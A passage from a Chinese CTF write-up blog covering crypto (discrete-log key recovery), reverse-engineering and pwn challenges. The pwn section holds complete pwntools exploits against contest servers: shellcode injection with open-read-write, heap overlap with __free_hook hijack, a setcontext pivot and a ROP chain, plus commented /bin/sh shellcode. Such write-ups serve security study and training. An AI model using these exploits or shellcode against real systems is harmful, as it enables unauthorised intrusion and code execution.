42297258788816007263333796194491196601979606573843177791726417124128570106777*i + 45527674821983322767637713856131638914194577467349514130179266972864796164733)], [(47645610858583239528541540288030905132801730740336899517917521534427703920375*i + 13272393664089987551368548207128885229248289454405159277755757369580866096516, 60503024931869977830369448001966194434192750710631225090391559259672930497207*i + 22742672333325631628906219543935772962495637869131049729874762344108069789046, 18239371575343144081671835175136676417172797381923442300525086630600561560114*i + 53605095942301227312866863441233162082087535371838738595931070092230378325532), (49652795839344946948771531270341537200526957150620826334216871981974859849848*i + 72788891932812016325514298655742330969740202920835574638161526839627026310392, 58465406030985457122487065262985150103086610852826560192123766406670919681919*i + 41631921368744416558173670147590406285376603436284660888096365325833457519047, 2867068797023070369258694926242485369317317985428997150826022662547346928319*i + 199536555238705400453079146297641296197748614855192340202929119323998667173), (19319782936524636558881137449470396788888469756320580071801690941326971557928*i + 34694728896207512382372151140975478616355941017631874070450334268575015485538, 60420266086997924618637147844041161464210208935194926422677077391866663978425*i + 13672363312837218411993834816309940812825734002380106434784905443915361955247, 56317025568717741728727542740124505299029374963112095990350877412868385510001*i + 56960621295573230601502052571104746367180500789238336757504091383665514782189)])</span><br><span class="line">F =  [(36081831373398765496490121898118275331597167308301671911642273861563666664545*i + 20818485079783326431414952124332440995164298376805349071762867760925654560129, 2080527476644284459469754065728582261439110792635520661740429151724797376184*i + 22485923248080983391383279592637691489160934672854638306617785344436031827838, 15544373162545014827602222261755865080947187122261471926061663568794038512828*i + 65994932829738499994169748656063604384011854387402875895186473718226656419067), (3553534440103543686958858303956716887328727627636404431097647427819509340361*i + 41182149981825439188243414995474733005799065992663037326956422731949977723727, 11444151159046255413538671703716370245288291793592500278345001664024824339590*i + 1802783416049323926195923226865768221398255563865542946492803065162093093803, 15739175840903697568714274177182938758189586472507039731239155962622285528109*i + 38249065906628598713138583591858150126778794837077688369911160900556744463900), (14364753807737302773559096493138893453118094354943941768609481298414054855231*i + 16290236676179704559365899211744462983770375364688247022596145726641137243214, 3863306473986430132042752882629555431418515741358351198972027547882636615940*i + 1209446834271293681961506708684952401569936830292701272655835127315444154958, 21868026584808712490812183410257662299067350008298604021123682243508255905173*i + 12828201007038003022201361213007595366913298546122923089499182187938898042596)]</span><br><span class="line">ct =  96910798667771988374291172958072220832574586618080134344021393928577220469428</span><br><span class="line"></span><br><span class="line">A, T, S, G = [M(ii) for ii in pk]</span><br><span class="line">F = M(F)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">############################################################### attack</span><br><span class="line">E = A*T*A</span><br><span class="line">detA, detT, detS, detG, detE, detF = A.det(), T.det(), S.det(), G.det(), E.det(), F.det()</span><br><span class="line">r = 2244966557637008779362441591080406338119704738381872153797151</span><br><span class="line">#R = 80839783875482453208291688688697485912290384775841712705111124172946909733768714734343762988749579725275997021760357500939</span><br><span class="line">#r = discrete_log(detG^R, ((detA^(-1)*detT).sqrt())^R, ord=(p^2-1)//R)</span><br><span class="line">#s = discrete_log(((detA^(-2)*detT^(-1)*detF).sqrt())^R, detG^R, ord=(p^2-1)//R)</span><br><span class="line">#not enough so use cado-nfs</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">command = [</span><br><span class="line">    &#x27;./cado-nfs.py&#x27;,</span><br><span class="line">    &#x27;-dlp&#x27;,</span><br><span class="line">    &#x27;-ell&#x27;, str(r),</span><br><span class="line">    &#x27;target=&#x27;+str(t1),</span><br><span class="line">    str(p)</span><br><span class="line">]</span><br><span class="line">#1541758195020130454925136833461872657607368759409055632195831</span><br><span class="line"></span><br><span class="line">command = [</span><br><span class="line">    &#x27;./cado-nfs.py&#x27;,</span><br><span class="line">    &#x27;-dlp&#x27;,</span><br><span class="line">    &#x27;-ell&#x27;, str(r),</span><br><span class="line">    &#x27;target=&#x27;+str(t2),</span><br><span class="line">    str(p)</span><br><span class="line">]</span><br><span class="line">#780392429787953543532147509264510635118839088869098098140941</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    result = subprocess.run(command, check=True, text=True, capture_output=True)</span><br><span class="line">    print(result.stdout)</span><br><span class="line">except subprocess.CalledProcessError as e:</span><br><span class="line">    print(f&quot;ERROR: &#123;e.returncode&#125;&quot;)</span><br><span class="line">    print(&quot;ERROR:&quot;, e.stderr)</span><br><span class="line"></span><br><span class="line">#t2^s = t1</span><br><span class="line">Fr = GF(r)</span><br><span class="line">s1 = Fr(1541758195020130454925136833461872657607368759409055632195831)</span><br><span class="line">s2 = Fr(780392429787953543532147509264510635118839088869098098140941)</span><br><span class="line">ss = discrete_log(pow(t1, 6*r, p), pow(t2, 6*r, p), operation=&quot;*&quot;, ord=(p-1)//r)</span><br><span class="line">s = crt([int(ss), int(s1/s2)], [(p-1)//(6*r), r])</span><br><span class="line"></span><br><span class="line">ss = s</span><br><span class="line">for ii in range(6):</span><br><span class="line">    s = ss + ii * (p-1) // 6</span><br><span class="line">    D = G^int(s)</span><br><span class="line">    K = list(D*S*D)</span><br><span class="line">    key = sum(K[0])+sum(K[1])+sum(K[2])</span><br><span class="line">    mask = int(sha256(str(key).encode()).hexdigest(),16)</span><br><span class="line">    pt = ct ^^ mask</span><br><span class="line">    if(D.det()*detE*D.det() == detF):</span><br><span class="line">        print(long_to_bytes(pt))</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"># QAQ~4_Br0ken_Crypto_Sy5tem~TAT</span><br></pre></td></tr></table></figure>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easygo"><a href="#easygo" class="headerlink" title="easygo"></a>easygo</h2><p>一道go，反汇编后直接跑脚本。。。原题。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nums=[0x22B9,0x0C9F8,0x8C89,0x0FF18,0x1439,0x4E0A,0x2A8B,0x7CB,0x0BDEB,0x0FAAB,0x3FFB,0x784B,0x9F1E,0x4FEB,0x4D0B,0x0D08E,0x38BB,0x0CBAE,0x0D2CE,0x913E,0x0A6B,0x0F03B,0x507B,0x398B,0x93DE,0x3CCE,0x459E,0x4ABE,0x553E,0x316E,0x33BE,0x42FE,0x0CECE,0x4DDE,0x982B,0x0A31B,0x802E,0x12EE,0x0F67A,0x0EB79]</span><br><span class="line">main_tmp=0xdead</span><br><span class="line">nums1=[]</span><br><span class="line">for i in range(40):</span><br><span class="line">  main_tmp = (291 * main_tmp + 1110)</span><br><span class="line">  main_tmp&amp;=0xffff</span><br><span class="line">  nums1.append(main_tmp)</span><br><span class="line">for i in range(40):</span><br><span class="line">  nums[i]^=nums1[i]</span><br><span class="line">import binascii</span><br><span class="line">dst=binascii.hexlify(bytes(nums))</span><br><span class="line">mm=bytes([dst[-1]])+dst[:-1]</span><br><span class="line">print(mm)</span><br><span class="line"># faddff8cb4d711edbb2294085339ce84</span><br></pre></td></tr></table></figure>
<h2 id="bouquet"><a href="#bouquet" class="headerlink" title="bouquet"></a>bouquet</h2><p>我们用ida打开附件，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200647459.png" alt="image-20241220200647459"></p>
<p>在这里面可以发现一个特殊的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a</span><br></pre></td></tr></table></figure>
<p>根据题目提示，这就是我们需要找的中序遍历，我们还需要去找一个前序或者后序</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200732610.png" alt="image-20241220200732610"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j7aw_sC3addq4TAo&#125;8_Fda&#123;SD</span><br></pre></td></tr></table></figure>
<p>我们直接去这个网站上生成<a target="_blank" rel="noopener" href="http://www.easycode.top/">http://www.easycode.top/</a></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200809570.png" alt="image-20241220200809570"></p>
<p>我们层序遍历读取flag即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;asd48_daj7w_3adqo&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>利用rsi残存，跳过去，再输入新的orw，执行就行，注意调整rsp，涉及到栈操作会受到影响。一开始分段去执行shellcode。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"># banary = &quot;./canary&quot;</span><br><span class="line"># elf = ELF(banary)</span><br><span class="line"># p = process(banary)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;139.155.126.78&#x27;, 30409)</span><br><span class="line"></span><br><span class="line">s = lambda data : p.send(data)</span><br><span class="line">sl = lambda data : p.sendline(data)</span><br><span class="line">sa = lambda text, data : p.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : p.sendlineafter(text, data)</span><br><span class="line">r = lambda : p.recv()</span><br><span class="line">ru = lambda text : p.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(p.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(p.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(p.recv(6),16)</span><br><span class="line">uheap = lambda : u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : p.interactive()</span><br><span class="line"></span><br><span class="line">pop_rsp = 0x40081B</span><br><span class="line">jmp_rsi = asm(&quot;jmp rsi&quot;)</span><br><span class="line">ru(b&#x27;journey\n&#x27;)</span><br><span class="line">pay = p64(0x400820)+p64(pop_rsp)+jmp_rsi</span><br><span class="line">s(pay)</span><br><span class="line">ru(b&#x27;Sea\n&#x27;)</span><br><span class="line">s(b&#x27;a&#x27;*16)</span><br><span class="line">ru(b&quot;magic\n&quot;)</span><br><span class="line">s(asm(&quot;syscall&quot;))</span><br><span class="line">pause() # 这个必须有,不然这次输入会被吞掉。</span><br><span class="line">ru(&quot;go!\n&quot;)</span><br><span class="line">jsp_add = asm(&quot;add rsp ,0x300;&quot;)</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">orw += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x100)</span><br><span class="line">orw += shellcraft.write(1,&#x27;rsp&#x27;,0x100)</span><br><span class="line">orw = asm(orw)</span><br><span class="line">sl(jmp_rsi+jsp_add+orw)</span><br><span class="line"></span><br><span class="line"># print(p.recv())</span><br><span class="line"># puts_shell = asm(&quot;mov rsi,0x601028; mov al,0x1; mov edi, 1; syscall; mov rsi,0x4008F1;jmp rsi;&quot;) # puts(puts_got)</span><br><span class="line"># print(len(puts_shell))</span><br><span class="line"># s(shellcode+puts_shell)</span><br><span class="line"></span><br><span class="line"># write_addr = u64(p.recvuntil(b&quot;\x00&quot;)[-7:-1].ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># print(hex(write_addr))</span><br><span class="line"># libc.address = write_addr - libc.sym.write</span><br><span class="line"># print(hex(libc.address))</span><br><span class="line"># # binsh = libc.address + 0x1B45BD</span><br><span class="line"># binsh =  libc.address + 0x1D8678</span><br><span class="line"># print(hex(binsh))</span><br><span class="line"># sh_shell = asm(f&quot;xor rsi,rsi; mov rdi, &#123;binsh&#125;; mov al,0x3b;cdq;syscall;&quot;)</span><br><span class="line"># pause()</span><br><span class="line"># # sh_shell = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><br><span class="line"># ru(b&#x27;journey\n&#x27;)</span><br><span class="line"># shellcode = asm(&quot;jmp rsi&quot;)</span><br><span class="line"># pay = p64(0x400820)+p64(pop_rsp)+shellcode</span><br><span class="line"># s(pay)</span><br><span class="line"># pause()</span><br><span class="line"># hint = 0x400817</span><br><span class="line"># ru(b&#x27;Deep Sea\n&#x27;)</span><br><span class="line"># s(p64(hint)+p64(0x4008EA))</span><br><span class="line"># ru(b&quot;have magic\n&quot;)</span><br><span class="line"># shellcode = asm(&quot;syscall&quot;)</span><br><span class="line"># s(shellcode)</span><br><span class="line"># pause()</span><br><span class="line"># ru(&quot;Let&#x27;s go!\n&quot;)</span><br><span class="line"></span><br><span class="line"># s(shellcode+sh_shell)</span><br><span class="line"># pause()</span><br><span class="line"># print(p.recv())</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200926195.png" alt="image-20241220200926195"></p>
<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"># elf=ELF(&#x27;./ezheap&#x27;)</span><br><span class="line"># p=process(&#x27;./ezheap&#x27;) </span><br><span class="line">p=remote(&#x27;139.155.126.78&#x27;,27277)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">s = lambda data : p.send(data)</span><br><span class="line">sl = lambda data : p.sendline(data)</span><br><span class="line">sa = lambda text, data : p.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : p.sendlineafter(text, data)</span><br><span class="line">r = lambda : p.recv()</span><br><span class="line">ru = lambda text : p.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(p.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(p.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(p.recv(6),16)</span><br><span class="line">uheap = lambda : u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : p.interactive() </span><br><span class="line"></span><br><span class="line">def get_addr():</span><br><span class="line">    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">def cmd(i):</span><br><span class="line">    sla(b&#x27;Your choice:&#x27;,str(i))</span><br><span class="line"> </span><br><span class="line">def add(idx,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(b&#x27;index:&#x27;,str(idx))</span><br><span class="line">    sla(b&#x27;Size:&#x27;,str(size))</span><br><span class="line"> </span><br><span class="line">def free(idx):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(b&#x27;index:&#x27;,str(idx))</span><br><span class="line">     </span><br><span class="line">def show(idx): # </span><br><span class="line">    cmd(4)    </span><br><span class="line">    sla(b&#x27;choose:&#x27;,str(idx))</span><br><span class="line">     </span><br><span class="line">def edit(idx,con):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b&#x27;index:&#x27;,str(idx))</span><br><span class="line">    sa(b&#x27;context:&#x27;,con)</span><br><span class="line"></span><br><span class="line"># prepare</span><br><span class="line">pause()</span><br><span class="line">add(0,0x18)  </span><br><span class="line">add(1,0x68)  </span><br><span class="line">add(2,0x68)  </span><br><span class="line">add(3,0x18)  </span><br><span class="line">edit(0,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(4,0xd8)  </span><br><span class="line"></span><br><span class="line"># pie</span><br><span class="line">show(4)</span><br><span class="line">ru(b&#x27;\n&#x27;)</span><br><span class="line">pie = int(p.recv(14),16)-0x202160</span><br><span class="line">lg(pie)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(pie+0x202020)) </span><br><span class="line">add(5,0x68)</span><br><span class="line">add(6,0x68)</span><br><span class="line">add(7,0x68)</span><br><span class="line"></span><br><span class="line">####</span><br><span class="line">edit(7,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span><br><span class="line">libc_base=get_addr()-0x3ed8b0</span><br><span class="line">lg(libc_base)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"># rop 打free hook</span><br><span class="line">pop_rdi = libc_base+0x2164f</span><br><span class="line">pop_rsi = libc_base+0x23a6a</span><br><span class="line">pop_rdx = libc_base+0x1b96</span><br><span class="line">pop_rax = libc_base+0x1b500 </span><br><span class="line"></span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(&quot;jmp rsp&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]+53</span><br><span class="line">open_addr=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read_addr=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write_addr=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27;*0x68+p64(0)+p64(free_hook&amp;0xfffffffffffff000)+p64(0)*2+p64(0x2000)</span><br><span class="line">payload = payload.ljust(0xa0,b&#x27;\x00&#x27;)+p64(free_hook&amp;0xfffffffffffff000)+p64(syscall)</span><br><span class="line"> </span><br><span class="line">add(8,0x18)</span><br><span class="line">add(9,0x58)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x18)</span><br><span class="line">edit(8,b&#x27;\x00&#x27;*0x18+p8(0xc1))</span><br><span class="line">free(9)</span><br><span class="line">add(12,0xb8)</span><br><span class="line">free(10)</span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x58+p64(0x61)+p64(free_hook)) </span><br><span class="line">add(13,0x58)</span><br><span class="line">add(14,0x58)</span><br><span class="line">edit(14,p64(setcontext))</span><br><span class="line">add(15,0x400)</span><br><span class="line">edit(15,payload)</span><br><span class="line">free(15)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = p64(pop_rdi)+p64(free_hook&amp;0xfffffffffffff000)</span><br><span class="line">payload += p64(pop_rsi)+p64(0x1000)</span><br><span class="line">payload += p64(pop_rdx)+p64(7)</span><br><span class="line">payload += p64(pop_rax)+p64(10)</span><br><span class="line">payload += p64(syscall) </span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(shellcraft.open(&#x27;/flag&#x27;))</span><br><span class="line">payload += asm(shellcraft.read(3,free_hook+0x300,0x30))</span><br><span class="line">payload += asm(shellcraft.write(1,free_hook+0x300,0x30))</span><br><span class="line"> </span><br><span class="line">sl(payload)</span><br><span class="line"> </span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220201014845.png" alt="image-20241220201014845"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220201023455.png" alt="image-20241220201023455"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220201031307.png" alt="image-20241220201031307"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://www.hackborgeous.top">hack_Borgeous</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://www.hackborgeous.top/post/260d256e.html">http://www.hackborgeous.top/post/260d256e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.hackborgeous.top" target="_blank">Borgeousのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/top_img58.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/lazyload.gif" data-original="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/Alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/lazyload.gif" data-original="/img/Alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img57.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第二届“长城杯”信息安全铁人三项赛部分wp</div></div></a></div><div class="next-post pull-right"><a href="/post/af4937d.html" title="2024长城杯溯源取证wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img59.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024长城杯溯源取证wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/af4937d.html" title="2024长城杯溯源取证wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img59.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-21</div><div class="title">2024长城杯溯源取证wp</div></div></a></div><div><a href="/post/5868712.html" title="Dragon Knight CTF 2024WP"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-05</div><div class="title">Dragon Knight CTF 2024WP</div></div></a></div><div><a href="/post/e73517db.html" title="SQL注入"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-02</div><div class="title">SQL注入</div></div></a></div><div><a href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img55.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-01</div><div class="title">WuCup网络安全技能大赛WP</div></div></a></div><div><a href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img57.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-16</div><div class="title">第二届“长城杯”信息安全铁人三项赛部分wp</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/lazyload.gif" data-original="/img/AVAtar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">hack_Borgeous</div><div class="author-info__description">阳光洒肩头，仿佛自由人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">138</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">57</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ikun123234"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ikun123234" target="_blank" title="Github"><i class="fab fa-github" style="color: ;"></i></a><a class="social-icon" href="https://qm.qq.com/q/h90oJQceJy" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3167722168@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">如果在阅读过程中遇到任何问题，请及时评论或留言，看到了会在第一时间回复</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople1.js"></script><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/zdog.dist.js"></script><script id="rendered-js" src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9F%E7%AE%97%E6%AF%94%E8%B5%9B"><span class="toc-number">1.1.</span> <span class="toc-text">速算比赛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sal%E5%9B%BE%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">Sal图集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popmart"><span class="toc-number">1.3.</span> <span class="toc-text">popmart</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gza-Cracker"><span class="toc-number">2.1.</span> <span class="toc-text">gza_Cracker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E8%89%AF%E5%8A%AB"><span class="toc-number">2.2.</span> <span class="toc-text">不良劫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%B5%81%E9%87%8F"><span class="toc-number">2.3.</span> <span class="toc-text">特殊流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PixMatrix"><span class="toc-number">2.4.</span> <span class="toc-text">PixMatrix</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DS"><span class="toc-number">3.</span> <span class="toc-text">DS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ds-findphone"><span class="toc-number">3.1.</span> <span class="toc-text">ds-findphone</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crypto"><span class="toc-number">4.1.</span> <span class="toc-text">easy-crypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mypow"><span class="toc-number">4.2.</span> <span class="toc-text">Mypow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ddd"><span class="toc-number">4.3.</span> <span class="toc-text">ddd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QAQAT"><span class="toc-number">4.4.</span> <span class="toc-text">QAQAT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easygo"><span class="toc-number">5.1.</span> <span class="toc-text">easygo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bouquet"><span class="toc-number">5.2.</span> <span class="toc-text">bouquet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">6.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#canary"><span class="toc-number">6.1.</span> <span class="toc-text">canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezheap"><span class="toc-number">6.2.</span> <span class="toc-text">ezheap</span></a></li></ol></li></ol></div></div><div class="card-widget 